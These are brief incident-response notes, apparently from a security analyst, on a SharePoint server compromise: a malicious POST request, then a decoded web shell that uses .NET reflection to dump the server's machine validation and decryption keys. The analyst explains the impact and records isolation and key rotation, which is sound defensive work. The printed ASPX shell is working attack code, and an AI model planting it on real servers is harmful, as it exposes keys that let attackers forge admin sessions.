
web traffic log shows suspicious POST request from 107.191.58.76. IP address flags as malicious on VirusTotal. Destination is on-site sharepoint server. referrer is tagged as _layouts/signout.aspx, to look more legitimate. content length is 7699 bytes

endpoint security tab, upon inspection of sharepoint server discovered a command was run on powershell at 1:07:11 am, its encoded command but here it is decoded:

{NÈ^-Wì{á'r*^t*&`ÓÝ<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server" language="c#" CODEPAGE="65001">
    public void Page_Load()
    {
        var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
        var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
        var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
        var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);

        Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
    }
</script>

This code uses .NET's reflection functionality to extract cryptographic keys and output them to anyone who accesses the specified/requested page. With these keys a malicious actor could log in as an admin, even without a password. I'm isolating the server as this is a massive security breach, recommending password and cryptographic key changes.
